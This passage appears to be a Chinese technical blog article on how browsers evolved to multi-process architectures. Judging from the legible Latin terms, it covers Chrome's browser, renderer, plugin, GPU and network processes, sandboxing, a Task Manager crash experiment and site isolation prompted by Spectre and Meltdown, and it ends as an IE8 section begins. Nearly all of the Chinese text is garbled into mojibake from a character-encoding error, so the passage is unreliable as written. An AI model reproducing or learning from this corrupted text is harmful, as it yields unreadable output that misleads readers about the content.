å‘å¤šè¿›ç¨‹æ¶æ„æ¼”åŒ–å¯èƒ½æ˜¯ç”±äºæ—©æœŸçš„ç½‘é¡µåŠŸèƒ½ç‰¹æ€§éƒ½æ¯”è¾ƒç®€å•ï¼Œä¸åƒç°åœ¨è¿™æ ·éœ€è¦éå¸¸ä¸°å¯Œçš„åŠŸèƒ½ç‰¹æ€§ï¼ˆæ¯”å¦‚ï¼šCanvasã€WebGLã€Webworker è¿™äº›ä¸œè¥¿ï¼‰ï¼Œé‚£ä¸ªæ—¶å€™å¸¸è§„æ¥è¯´å•è¿›ç¨‹å°±è¶³å¤Ÿäº†ã€‚æ›¾ç»å‰ç«¯çš„å¼€å‘å·¥ä½œè¿˜æ²¡é‚£ä¹ˆå¤æ‚çš„æ—¶å€™ï¼Œé¡µé¢å¾ˆå¤šéƒ½æ˜¯åç«¯ç›´æ¥å°±å†™äº†ã€‚ç°åœ¨æœ‰äº†å‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆè¿™æ ·çš„ä¸€ä¸ªèŒä½ï¼Œè€Œä¸”æœ‰äº†æ›´åŠ ç³»ç»Ÿå’Œå…¨é¢çš„å‰ç«¯å¼€å‘å·¥ä½œæµï¼Œå‰ç«¯çš„é‡è¦æ€§å’Œå¤æ‚æ€§éƒ½åœ¨ä¸æ–­æå‡ã€‚é™¤äº†å•è¿›ç¨‹æµè§ˆå™¨è‡ªèº«å­˜åœ¨çš„ä¸€äº›é—®é¢˜ï¼Œé¢å¯¹æ—¶ä»£çš„å˜é©ï¼Œå‰ç«¯çš„å´›èµ·ï¼Œæµè§ˆå™¨è‹¥è¿˜åœç•™åœ¨åŸåœ°è‚¯å®šæ˜¯è¡Œä¸é€šçš„ï¼Œå¿…ç„¶æ— æ³•æ”¯æ’‘æ–°çš„æŠ€æœ¯çš„å‘å±•ï¼Œä½•å†µå•è¿›ç¨‹æœ¬èº«å¸¦æ¥çš„é—®é¢˜ä¹Ÿæ˜¯éœ€è¦è§£å†³çš„ã€‚ æ‰€è°“å¤šè¿›ç¨‹æµè§ˆå™¨å½“ç„¶å°±æ˜¯å°†æµè§ˆå™¨çš„å„ç§ä¸åŒç±»åˆ«çš„ä»»åŠ¡æ‹†åˆ†å‡ºæ¥ï¼Œæ”¾åˆ°å¤šä¸ªä¸åŒçš„è¿›ç¨‹ä¸­å»æ‰§è¡Œã€‚è¿™é‡Œä¼šç”¨åˆ°ä¸€ä¸ªå…³é”®çš„å®‰å…¨æŠ€æœ¯ï¼Œå°±æ˜¯Sandoxã€‚ Sandboxï¼ˆæ²™ç›’ï¼‰\å¯ä»¥çœ‹åšå°±æ˜¯*ä¸€ä¸ªè¢«é™åˆ¶äº†æƒé™çš„è¿›ç¨‹*ï¼Œä¸€ä¸ªç¨å¾®ä¸¥æ ¼çš„å®šä¹‰æ˜¯è¿™æ ·çš„ æ²™ç®±æŠ€æœ¯æŒ‰ç…§å®‰å…¨ç­–ç•¥æ¥é™åˆ¶ç¨‹åºå¯¹ç³»ç»Ÿèµ„æºçš„ä½¿ç”¨ï¼Œè¿›è€Œé˜²æ­¢å…¶å¯¹ç³»ç»Ÿè¿›è¡Œç ´åï¼Œå…¶æœ‰æ•ˆæ€§ä¾èµ–äºæ‰€ä½¿ç”¨çš„å®‰å…¨ç­–ç•¥çš„æœ‰æ•ˆæ€§ ä¹Ÿå°±æ˜¯è¯´æ²™ç›’é™åˆ¶äº†å¤šå°‘æƒé™æ˜¯æ ¹æ®ä½ çš„å®‰å…¨ç­–ç•¥æ¥çš„ï¼Œå®ƒèƒ½é˜²æ­¢ç³»ç»Ÿè¢«æ¶æ„ç ´åï¼Œæä¾›äº†ä¸€å®šçš„å®‰å…¨æ€§ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¸Šé¢æåˆ°çš„ â€œä¸å®‰å…¨â€ è¿™ä¸€ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆçš„ä¸€ç¯ã€‚å…·ä½“çš„æ²™ç›’çš„å®ç°æ–¹æ³•å‘¢åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šéƒ½æ˜¯æœ‰å·®å¼‚çš„ï¼Œæ¯•ç«Ÿè¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬çš„é‡ç‚¹ï¼Œå°±æ­¤æ‰“ä½ã€‚ æ¥ç€æˆ‘ä»¬ä¸€èµ·æ¥çœ‹ä¸€ä¸‹Chromeã€IE å’Œ Firefoxè¿™ä¸‰æ¬¾æµè§ˆå™¨æ˜¯å¦‚ä½•æ¼”åŒ–è‡ªèº«åˆ°å¤šè¿›ç¨‹çš„ä¸€ä¸ªæ¶æ„æ–¹æ¡ˆçš„ï¼Ÿ Chromeçš„å¤šè¿›ç¨‹æ¶æ„Google Chromeæµè§ˆå™¨æœ€æ—©æ˜¯åœ¨2008å¹´å‘å¸ƒçš„ï¼Œæ¯”èµ·IEè¿™ç§è€ç‰Œæµè§ˆå™¨ï¼Œç°åœ¨çœ‹æ¥ç®—æ˜¯åèµ·ä¹‹ç§€ã€‚ä¸è¿‡è¿™ä¸ªåèµ·ä¹‹ç§€å¹¶éåªæ˜¯çªå…€çš„æ¥æŠ¢å æµè§ˆå™¨å¸‚åœºä»½é¢çš„ï¼Œè¿™ä¸€ç‚¹ä» Chromeä¸€å¼€å§‹å°±æ˜¯åŸºäºå¤šè¿›ç¨‹æ¶æ„ å¯è§ç«¯å€ªã€‚ åœ¨Chromeçš„å¤šè¿›ç¨‹æ¶æ„ä¸­ï¼ŒåŒ…å«è¿™æ ·å‡ ç§è¿›ç¨‹ æµè§ˆå™¨ä¸»è¿›ç¨‹ã€‚æ•´ä¸ªæµè§ˆå™¨çš„ä¸»è¦è¿›ç¨‹ï¼Œå…¶ä»–å‡ ä¸ªè¿›ç¨‹éƒ½æ˜¯è¿™ä¸ªè¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œç”±å®ƒæ¥ç®¡ç†å’Œè°ƒé…ï¼›åŒæ—¶ä½ æ‰€çœ‹åˆ°çš„æµè§ˆå™¨çš„æ•´ä¸ªçª—å£ï¼ŒåŒ…å«åœ°å€è¾“å…¥æ ï¼Œä¹¦ç­¾æ è¿™äº›ä¸œè¥¿ä¹Ÿéƒ½æ˜¯å®ƒæ¥å±•ç¤ºçš„ï¼› æ¸²æŸ“è¿›ç¨‹ã€‚ä¸€èˆ¬æ¥è¯´ä¸€ä¸ªTabæ ‡ç­¾é¡µé¢ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼ˆå¯¹äºä¸ä¸€èˆ¬çš„æƒ…å†µå¯ä»¥äº†è§£Site Isolationç­–ç•¥ï¼‰ï¼›æ¯ä¸ªæ¸²æŸ“è¿›ç¨‹ä¸­ä¼šè¿è¡ŒBlinkå¸ƒå±€å¼•æ“ï¼ŒV8 JavaScriptæ‰§è¡Œå¼•æ“ç­‰ï¼Œå•ç‹¬æœåŠ¡äºä¸€ä¸ªTabæ ‡ç­¾é¡µï¼›è¿è¡Œåœ¨æ²™ç›’ä¸­æ— æ³•è®¿é—®ç³»ç»Ÿèµ„æºã€‚ æ’ä»¶è¿›ç¨‹ã€‚ä¸€ä¸ªæ’ä»¶å•ç‹¬å­˜åœ¨äºä¸€ä¸ªè¿›ç¨‹å½“ä¸­ï¼ŒåŒæ—¶ä¸ºäº†å®‰å…¨æ€§ï¼Œè¿è¡Œåœ¨æ²™ç›’ä¸­é™åˆ¶å…¶æƒé™ã€‚ ç½‘ç»œè¿›ç¨‹ã€‚å‘èµ·ç½‘ç»œè¯·æ±‚è®¿é—®ã€‚ GPUè¿›ç¨‹ã€‚å¤„ç†GPUæ¸²æŸ“æ–¹é¢çš„ä»»åŠ¡ã€‚ å¯ä»¥çœ‹å¾—å‡ºï¼Œchromeè¿™æ ·çš„å¤šè¿›ç¨‹è®¾è®¡ï¼Œå°†åŸæœ¬æ‰åˆ°ä¸€èµ·çš„å„ç§ä»»åŠ¡æ ¹æ®èŒè´£çš„ä¸åŒåˆ†æ‹†äº†å‡ºå»ï¼Œæå¤§çš„å‡è½»äº†å•è¿›ç¨‹çš„æ‰§è¡Œè´Ÿæ‹…ã€‚ï¼ˆå…¶å®ï¼Œæœ€æ—©çš„chromeè¿›ç¨‹è®¾è®¡å…¶å®æ²¡æœ‰å•ç‹¬çš„ç½‘ç»œè¿›ç¨‹å’ŒGPUè¿›ç¨‹çš„ï¼Œéƒ½æ˜¯æ”¾åˆ°æµè§ˆå™¨ä¸»è¿›ç¨‹ä¸­çš„ï¼‰ å½“ä½ æ‰“å¼€æµè§ˆå™¨çš„æ—¶å€™ï¼Œé»˜è®¤å…ˆå¯åŠ¨æµè§ˆå™¨ä¸»è¿›ç¨‹ï¼Œå±•ç¤ºäº†æ•´ä¸ªæµè§ˆå™¨çª—å£å’Œåœ°å€æ ç­‰ä¸€ç³»åˆ—çš„åŸºç¡€UIç•Œé¢ã€‚ç„¶åä¸»è¿›ç¨‹å¯åŠ¨å…¶ä»–çš„å„é¡¹å­è¿›ç¨‹ã€‚å½“ä½ é™„å¸¦è¦è¿è¡Œæ’ä»¶çš„æ—¶å€™ï¼Œå°±ç»™å¯¹åº”çš„æ’ä»¶åˆ†é…ä¸€ä¸ªè¿›ç¨‹ï¼Œå¦‚æœæ²¡æœ‰å°±ä¸åˆ†é…ã€‚å½“ä½ æ‰“å¼€äº†ä¸€ä¸ªTabæ ‡ç­¾é¡µçš„æ—¶å€™ï¼Œåˆä¼šæ ¹æ®è¿™ä¸ªæ ‡ç­¾é¡µåˆ›å»ºä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼Œç”¨äºæ ‡ç­¾é¡µå†…é¡µé¢çš„æ¸²æŸ“å’Œè„šæœ¬çš„æ‰§è¡Œã€‚å½“ç„¶ï¼Œå¦‚æœä½ çš„é¡µé¢ä½¿ç”¨äº†WebGLæˆ–è€…CSS3åŠ¨ç”»ä¹‹ç±»çš„éœ€è¦GPUåšæ¸²æŸ“çš„ä¸œè¥¿ï¼ŒChromeä¹Ÿç»™äº†ä¸€ä¸ªç»Ÿä¸€çš„CPUè¿›ç¨‹æ¥ç»´æŠ¤è¿™äº›æ¸²æŸ“ä»»åŠ¡ã€‚ä½ çš„htmlé¡µé¢æˆ–è€…jsè„šæœ¬æ˜¯éœ€è¦ä»æœåŠ¡å™¨ä¸‹è½½åˆ°æœ¬åœ°æ‰èƒ½è¢«æ¸²æŸ“è¿›ç¨‹ä½¿ç”¨çš„ï¼Œé‚£æˆ‘ä»¬å°±å•ç‹¬æœ‰ä¸ªç½‘ç»œè¿›ç¨‹æ¥å¤„ç†è¿™äº›å’Œç½‘ç»œäº¤äº’ç›¸å…³çš„ä»»åŠ¡ã€‚å› æ­¤ï¼Œä¸€ä¸ªåŸºæœ¬çš„å¤šè¿›ç¨‹æ¶æ„å°±è¿™æ ·å‘ˆç°äº†å‡ºæ¥ã€‚ å…¶ä¸­æˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°å‡ ç‚¹ï¼š å…¶ä»–å„ä¸ªè¿›ç¨‹éƒ½æ˜¯ç”±æµè§ˆå™¨ä¸»è¿›ç¨‹å¯åŠ¨å’Œç®¡ç†çš„ï¼Œè¿›ç¨‹é—´é€šè¿‡IPCè¿›è¡Œæ•°æ®é€šä¿¡ã€‚ æ¸²æŸ“è¿›ç¨‹å’Œæ’ä»¶è¿›ç¨‹å¯èƒ½ä¸æ­¢ä¸€ä¸ªï¼Œæ ¹æ®è¦æ¸²æŸ“çš„é¡µé¢å’Œæ’ä»¶æ•°è€Œå®šã€‚ è§£å†³é—®é¢˜äº†ä¹ˆé‚£è¿™æ ·è§£å†³äº†æˆ‘ä»¬å•è¿›ç¨‹æµè§ˆå™¨ä¸­å‡ºç°çš„é—®é¢˜ä¹ˆï¼Ÿå½“ç„¶æ˜¯è§£å†³äº†ã€‚ é¦–å…ˆæˆ‘ä»¬çœ‹ä¸ç¨³å®šçš„é—®é¢˜ï¼Œä¸ç¨³å®šæ˜¯ç”±äºæ’ä»¶æˆ–è€…æ¸²æŸ“å¼•æ“ä¹‹ç±»çš„å‡ºé”™å¯¼è‡´çš„ï¼Œç°åœ¨ä¸ç®¡æ˜¯æ’ä»¶è¿˜æ˜¯é¡µé¢çš„æ¸²æŸ“å·¥ä½œéƒ½æ˜¯å•ç‹¬åœ¨å„è‡ªçš„çº¿ç¨‹ä¸­è¿è¡Œçš„ï¼Œå¦‚æœæŸä¸ªæ’ä»¶å‡ºé”™äº†ï¼Œé‚£æœ€å¤šæ˜¯é‚£ä¸ªæ’ä»¶ä¸èƒ½ç”¨ï¼Œå…¶ä»–é¡µé¢çš„æµè§ˆå’Œå…¶ä»–çš„æ’ä»¶éƒ½ä¼šç…§å¸¸è¿è¡Œã€‚å¦‚æœæ˜¯æŸä¸ªæ¸²æŸ“è¿›ç¨‹å‡ºé”™ï¼Œé‚£ä¹Ÿåªæ˜¯é‚£ä¸ªé¡µé¢çœ‹ä¸äº†äº†è€Œå·²ï¼Œå…¶ä»–é¡µé¢ä¹Ÿä¸ä¼šå—åˆ°å½±å“ï¼Œæ›´åˆ«è¯´æŠŠæ•´ä¸ªæµè§ˆå™¨æå´©æºƒã€‚è¯´åˆ°è¿™é‡Œï¼Œä½ æ˜¯ä¸æ˜¯åˆæƒ³èµ·äº†æ›¾ç»æŸä¸ªé¡µé¢æ˜¾ç¤ºâ€œå´©æºƒäº†â€ï¼Œç„¶åä½ å…³é—­é‚£ä¸ªTabæ ‡ç­¾ç„¶åé‡æ–°æ‰“å¼€ä¸€ä¸‹å°±å¥½äº†ï¼›åˆæˆ–è€…æ›¾ç»æµè§ˆå™¨å‘Šè¯‰ä½ ä½ çš„Flashæ’ä»¶å´©æºƒäº†ï¼Œä½ æƒ³çœ‹æœ‰äº›è§†é¢‘ç½‘ç«™çœ‹ä¸äº†ï¼Œä½†æ˜¯ç½‘é¡µè¿˜æ˜¯æ­£å¸¸çš„ï¼Œé‡å¯æµè§ˆå™¨ä¹‹åï¼ŒFlashåˆæ¢å¤äº†ã€‚ğŸ¤“ ç„¶åå†æ˜¯ä¸æµç•…ã€‚åœ¨é¡µé¢ã€æ’ä»¶å’Œæµè§ˆå™¨ä¸‰ç§å„è‡ªåˆ†åˆ«æœ‰å„è‡ªçš„çº¿ç¨‹çš„æƒ…å†µä¸‹ï¼Œæ’ä»¶çš„æ‰§è¡Œä¸æµç•…åªä¼šå½±å“åˆ°æ’ä»¶è‡ªèº«ï¼Œé¡µé¢çš„æ— è®ºæ¸²æŸ“è¿˜æ˜¯jsçš„æ‰§è¡Œï¼Œä¸æµç•…é‚£ä¹Ÿåªæ˜¯é‚£ä¸€ä¸ªé¡µé¢ã€‚è‹¥æ˜¯æ”¾åœ¨å•è¿›ç¨‹æµè§ˆå™¨æ—¶ä»£ï¼Œæˆ‘ä»¬è¯´çš„ä¸æµç•…é‚£å°±æ˜¯ä¸ç®¡ä»»ä½•é¡µé¢è¿˜æ˜¯ä»»ä½•ä¸€ä¸ªæ’ä»¶å¼•èµ·çš„ï¼Œä¼šå¯¼è‡´æ•´ä¸ªæµè§ˆå™¨çª—å£ã€æ‰€æœ‰é¡µé¢ã€æ‰€æœ‰æ’ä»¶çš„ä¸æµç•…ã€‚å¤šè¿›ç¨‹çš„æ–¹å¼ï¼Œè®©è¿™ç§â€œå…±æ‚£éš¾â€çš„æ¨¡å¼ä¸å¤å­˜åœ¨ã€‚ğŸ¤£ æœ€åå†è°ˆä¸å®‰å…¨ã€‚å¤šè¿›ç¨‹å¯¹å®‰å…¨é—®é¢˜çš„å¤„ç†ä¸»è¦é ä¸¤æ–¹é¢ï¼š1.æ¸²æŸ“è¿›ç¨‹å’Œæ’ä»¶è¿›ç¨‹è¿è¡Œåœ¨æ²™ç›’ç¯å¢ƒä¸­ï¼›2.ç›¸äº’éš”ç¦»çš„è¿›ç¨‹æ•°æ®ä¸å…±äº«ã€‚æ‹†åˆ†æˆå¤šçº¿ç¨‹çš„å½¢å¼è®©æˆ‘ä»¬èƒ½å¤Ÿå¯¹æ¯ä¸ªå•ç‹¬çš„é¡µé¢å’Œæ¯ä¸ªå•ç‹¬çš„æ’ä»¶åŠ ä¸Šæ²™ç›’é™åˆ¶ï¼Œå‰¥é™¤äº†æ¸²æŸ“è¿›ç¨‹çš„æ–‡ä»¶ç³»ç»Ÿæƒé™ï¼Œç½‘ç»œè®¿é—®æƒé™ç­‰ï¼›å¯¹äºæ’ä»¶è¿›ç¨‹ï¼Œä¹Ÿæ— æ³•å¯¹æŸä¸ªé¡µé¢å…¨æƒæ“æ§ï¼Œæˆ–è€…å¯¹æµè§ˆå™¨ä¸»è¿›ç¨‹æ•°æ®ä»»æ„è®¿é—®å’Œä¿®æ”¹ï¼Œæ’ä»¶è‡ªèº«èƒ½åšä»€ä¹ˆä¹Ÿä¸¥æ ¼å—åˆ°é™åˆ¶ã€‚å¦‚æœä»–ä»¬éœ€è¦æŸç§æ“ä½œï¼Œæ¯”å¦‚ç½‘ç»œè¯·æ±‚æˆ–è€…æ–‡ä»¶è®¿é—®æ€ä¹ˆåŠå‘¢ï¼Ÿé€šè¿‡IPCå‘ŠçŸ¥æµè§ˆå™¨ä¸»è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹æ¥å†³å®šç»™ä¸ç»™ä½ æƒé™ä»¥åŠç»™ä½ å“ªäº›æƒé™ã€‚æ˜¯ä¸æ˜¯åˆæƒ³èµ·äº†åœ¨chromeä¸­æ‰“å¼€æŸä¸ªåœ°å›¾ç½‘ç«™ï¼Œæµè§ˆå™¨é—®ä½ â€œæ˜¯å¦å…è®¸ç½‘ç«™è·å–ä½ çš„ä½ç½®ä¿¡æ¯â€ï¼Œåˆæˆ–è€… â€œæ˜¯å¦å…è®¸ç½‘ç«™ä½¿ç”¨æ‘„åƒå¤´â€ ğŸ˜‡ åšä¸€ä¸ªå°å®éªŒç°åœ¨ä½ å¯ä»¥è·Ÿç€ä¸€èµ·æ‰“å¼€Chrome ã€è®¾ç½®ã€‘=&gt; ã€æ›´å¤šå·¥å…·ã€‘=&gt; ã€ä»»åŠ¡ç®¡ç†å™¨ã€‘çœ‹çœ‹ä½ çš„Chromeè¿è¡Œäº†å“ªäº›è¿›ç¨‹ã€‚ è¿™é‡Œæˆ‘ç›´æ¥æ‰“å¼€Chromeæµè§ˆå™¨ï¼Œç„¶åæ‰“å¼€äº†ä¸¤ä¸ªTabï¼Œä¸€ä¸ªæ˜¯ç™¾åº¦ä¸€ä¸ªæ˜¯Googleã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ä»»åŠ¡ç®¡ç†å™¨é‡Œæ˜¾ç¤ºäº†æˆ‘ä»¬çš„æµè§ˆå™¨è¿è¡Œäº†å“ªäº›è¿›ç¨‹ï¼ŒåŒ…æ‹¬è¿›ç¨‹çš„åç§°ï¼Œå†…å­˜å ç”¨å¤§å°ï¼ŒCPUä½¿ç”¨ç‡ï¼Œç½‘ç»œå’Œè¿›ç¨‹IDç­‰ä¿¡æ¯ï¼ˆå®é™…ä½ å¯ä»¥åœ¨è¿™ä¸ªæ ‡å¤´ç‚¹å‡»é¼ æ ‡å³é”®åˆ—å‡ºæ›´å¤šå‚è€ƒä¿¡æ¯ï¼‰ã€‚å’Œæˆ‘ä»¬åˆšæ‰è¯´çš„å·®ä¸å¤šï¼Œæˆ‘ä»¬æ— è®ºå¦‚ä½•å¾—æœ‰ä¸€ä¸ªæµè§ˆå™¨ä¸»è¿›ç¨‹ï¼Œç„¶åæœ‰ä¸€ä¸ªGPUè¿›ç¨‹æ¸²æŸ“ä¸€äº›å›¾å½¢ç›¸å…³çš„ä¸œè¥¿ï¼Œè¿˜æœ‰ä¸€ä¸ªNetwork çš„ç½‘ç»œè¿›ç¨‹ï¼Œå¦å¤–ä¸¤ä¸ªæ ‡ç­¾é¡µåˆ†åˆ«å°±æ˜¯ä¸¤ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚è¿™ä¸ªæ—¶å€™æˆ‘æƒ³æ¨¡æ‹Ÿä¸€ä¸‹å½“æŸä¸ªæ¸²æŸ“è¿›ç¨‹å´©æºƒä¼šå‡ºç°å•¥ï¼Œç‚¹å‡»ç™¾åº¦è¿™è¿™ä¸ªæ ‡ç­¾é¡µï¼Œç„¶åç‚¹å‡»å³ä¸‹è§’çš„ç»“æŸè¿›ç¨‹ã€‚ä½ æ˜¯ä¸æ˜¯ä¹Ÿå’Œæˆ‘ä¸€æ ·ï¼Œå‡ºç°äº†ä¸‹é¢çš„é¡µé¢å‘¢ã€‚ ä½ åº”è¯¥ä¹Ÿæ³¨æ„åˆ°äº†æ•´ä¸ªæµè§ˆå™¨ä»ç„¶æ˜¯ç¨³å®šè¿è¡Œçš„ï¼ŒGoogleçš„é‚£ä¸ªé¡µé¢ä¹Ÿæ˜¯æ­£å¸¸çš„ï¼Œå´©æ‰çš„åªæœ‰ç™¾åº¦çš„è¿™ä¸€ä¸ªé¡µé¢è€Œå·²ã€‚å¦‚æœä½ çš„æµè§ˆå™¨é‡Œè¿è¡Œäº†æ’ä»¶ï¼Œä½ ä¹Ÿå¯ä»¥è¯•ç€å…³æ‰æ’ä»¶è¿›ç¨‹è¯•è¯•ã€‚ è¿™ä¸ªå°å®éªŒæ˜¯å¦å¯¹ â€œæ›¾ç»åœ¨ä½ æ‰“å¼€æŸä¸ªé¡µé¢ç”±äºæŸç§åŸå› æ•´ä¸ªæµè§ˆå™¨å°±å¡ä½ï¼Œè¿å…³é—­æŒ‰é’®éƒ½ç‚¹ä¸åŠ¨çš„æ—¶å€™ï¼Œä½ æ˜¯åªèƒ½å¼ºåˆ¶å…³æ‰æ•´ä¸ªæµè§ˆå™¨ä¹ˆï¼Ÿâ€ è¿™ä¸ªé—®é¢˜äºä½ æœ‰æ‰€å¯å‘å‘¢ï¼Ÿ ç«™ç‚¹éš”ç¦»(Site Isolation)å¯¹äºChromeçš„å¤šè¿›ç¨‹æ¶æ„è¿˜æœ‰ä¸€ä¸ªå¿…ç„¶éœ€è¦è°ˆåˆ°çš„ä¸œè¥¿ï¼Œå°±æ˜¯ç«™ç‚¹éš”ç¦» Site Isolation ç­–ç•¥ã€‚æˆ‘ä»¬ä¹‹å‰è¯´çš„æ˜¯ä¸€ä¸ªæ ‡ç­¾é¡µä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼Œä½†å®é™…æƒ…å†µä¸‹å¦‚æœçœŸçš„æ¯ä¸ªä¾¿ç­¾é¡µéƒ½æ˜¯ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹çš„è¯ï¼Œé‚£è¿˜æ˜¯æœ‰ç‚¹æµªè´¹è¿›ç¨‹èµ„æºçš„ã€‚å¦ä¸€ä¸ªæ–¹é¢æœ‰ä¸ªå¾ˆç‰¹æ®Šçš„é—®é¢˜å°±æ˜¯å¦‚æœåªæ˜¯ä¸€ä¸ªæ ‡ç­¾é¡µä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹çš„è¯ï¼Œé‚£å¦‚æœå­˜åœ¨ä¸€ä¸ªæ ‡ç­¾é¡µï¼Œé‡Œé¢æœ‰ä¸€ä¸ªiframeå¼•ç”¨äº†å¦ä¸€ä¸ªé¡µé¢ï¼Œé‚£è¿™ä¸¤ä¸ªä¸åŒç½‘ç«™çš„é¡µé¢å°±ä¼šåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­å»æ¸²æŸ“å’Œæ‰§è¡Œè„šæœ¬ã€‚è¿™æ ·æ¥çœ‹ï¼ŒTabçš„è¿›ç¨‹éš”ç¦»å¹¶ä¸èƒ½å¯¹ç«™ç‚¹åšéš”ç¦»ã€‚è€Œä¸”ç”±äºå·²çŸ¥å­˜åœ¨çš„CPUçº§åˆ«çš„æ¼æ´Spectreå’ŒMeltdownï¼ˆå®ƒä»¬å¯ä»¥è®©ç¨‹åºè®¿é—®åˆ°ä¸å±äºå½“å‰è¿›ç¨‹çš„æ•°æ®ï¼‰ï¼Œä»å®‰å…¨æ€§ä¸Šæ¥è¯´ï¼ŒChromeä¹Ÿå¿…é¡»å¯¹â€œä¸€ä¸ªæ ‡ç­¾é¡µä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹â€çš„ç­–ç•¥åšè°ƒæ•´ã€‚ è¿™é‡Œçš„è°ƒæ•´ç­–ç•¥å°±æ˜¯ç«™ç‚¹éš”ç¦»ç­–ç•¥ã€‚æ‰€è°“ç«™ç‚¹éš”ç¦»ï¼Œå°±æ˜¯æŒ‡åŒä¸€ä¸ªåŸŸä¸‹çš„å†…å®¹ï¼Œä¼šæ”¾åœ¨åŒä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ä¸­è¿›è¡Œæ¸²æŸ“ã€‚å¯¹äºåˆšæ‰æˆ‘ä»¬æåˆ°çš„ä¸€ä¸ªTabæ ‡ç­¾é¡µä¸­å­˜åœ¨iframeå¼•å…¥å…¶ä»–ç½‘é¡µçš„æƒ…å†µï¼Œæ ‡ç­¾é¡µè‡ªèº«è‚¯å®šæ˜¯ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼Œä½†å¯¹äºå†…éƒ¨çš„iframeï¼Œå¦‚æœiframeæ˜¯å’Œæ ‡ç­¾é¡µå±äºåŒä¸€åŸŸï¼Œé‚£å°±å…±ç”¨æ¸²æŸ“è¿›ç¨‹ï¼Œå¦åˆ™ä¼šç»™è¿™ä¸ªiframeä¸€ä¸ªå•ç‹¬çš„æ¸²æŸ“è¿›ç¨‹ã€‚æ¯”å¦‚ä¸‹é¢è¿™å¼ å›¾ä¸­çš„ a.comã€b.comå’Œc.com çš„é¡µé¢å°±æ˜¯å•ç‹¬å„è‡ªéƒ½æœ‰ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚è€Œå¦‚æœ b.comä½ å°†å…¶æ¢æˆ a.com ä¸‹çš„æŸä¸ªå…¶ä»–é¡µé¢ï¼Œé‚£ä»–ä»¬å°±ä¼šä½¿ç”¨åŒä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹äº†ã€‚ å…¶å®ç«™ç‚¹éš”ç¦»æœ€é‡è¦çš„ä½œç”¨è¿˜æ˜¯å¯¹äºå®‰å…¨æ€§çš„è¦æ±‚ï¼Œå…¶æ¬¡æ‰æ˜¯å¯ä»¥èŠ‚çœé‚£ä¹ˆä¸€ç‚¹å†…å­˜ã€‚ è¿™é‡Œç»™å„ä½æä¾›ä¸€ä¸ªæµ‹è¯•è¿™ä¸ªç‰¹æ€§çš„ç½‘ç«™: csreis.github.io/tests/crossâ€¦ ã€‚ åœ¨Chromeä¸­æ‰“å¼€ï¼ŒåŒæ—¶æ‰“å¼€ä¸Šé¢æˆ‘ä»¬å®éªŒçš„æ—¶å€™æ‰“å¼€è¿‡çš„ã€ä»»åŠ¡ç®¡ç†å™¨ã€‘ï¼Œç‚¹å‡»æµ‹è¯•ç½‘ç«™çš„æŒ‰é’®ï¼Œè§‚å¯Ÿè§‚å¯Ÿä¼šå‘ç”Ÿä»€ä¹ˆã€‚ï¼ˆæ³¨ï¼šå±äºåŒä¸€ä¸ªè¿›ç¨‹çš„æ—¶å€™ï¼Œåªæœ‰è¡¨ç¤ºé¡µé¢çš„ä¿¡æ¯è¡Œï¼Œæ²¡æœ‰è¿›ç¨‹ID ï¼‰ã€‚ğŸ˜ è¿™é‡Œå…¶å®ç«™ç‚¹éš”ç¦»ç­–ç•¥ä¹Ÿæ˜¯é€‚ç”¨äºä»ä¸€ä¸ªé¡µé¢é‡Œæ‰“å¼€çš„æ–°çš„Tabé¡µçš„ï¼Œæ¯”å¦‚æˆ‘å…ˆæ‰“å¼€å¾—åˆ°æ‹›è˜é¡µçš„ç½‘ç«™ www.igetget.com/join/work ç‚¹å‡»å³ä¸Šè§’ â€œäº†è§£æˆ‘ä»¬â€ï¼Œè¿™ä¸ªæ—¶å€™ä¼šæ‰“å¼€ä¸€ä¸ªæ–°çš„Tabï¼Œç„¶åå†å»ã€ä»»åŠ¡ç®¡ç†å™¨ã€‘é‡Œé¢æŸ¥çœ‹ï¼Œä½ ä¼šå‘ç°ï¼Œæ–°æ‰“å¼€çš„Tabé¡µæ˜¯æ²¡æœ‰è¿›ç¨‹IDçš„ï¼Œå½“ä½ ç‚¹å‡»è¿™ä¸ªè¿›ç¨‹çš„æ—¶å€™ï¼Œå®ƒä¼šé€‰ä¸­è¿™ä¸¤ä¸ªä¾¿ç­¾é¡µè¡Œï¼Œå…¶å®ä¹Ÿå°±æ˜¯è¯´å®ƒä»¬æ˜¯ç”¨çš„åŒä¸€ä¸ªè¿›ç¨‹ã€‚ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬æ–°æ‰“å¼€çš„Tabå’ŒåŸå§‹é¡µé¢å±äºåŒä¸€ä¸ªåŸŸï¼‰ IEçš„å¤šè¿›ç¨‹æ¶æ„IEæµè§ˆå™¨ä»IE8å¼€å§‹å…¶è¿›ç¨‹æ¶æ„å°±å˜æˆå¤šè¿›ç¨‹çš„äº†ã€‚ä¸‹å›¾å°±æ˜¯IE8çš„è¿›ç¨‹æ¶æ„ç¤ºæ„å›¾ã€‚çœ‹èµ·æ¥æ˜¯ä¸æ˜¯æœ‰ç‚¹æ…Œä¹±ï¼Œæˆ‘ä»¬æ¥ç†ä¸€ä¸‹ã€‚ 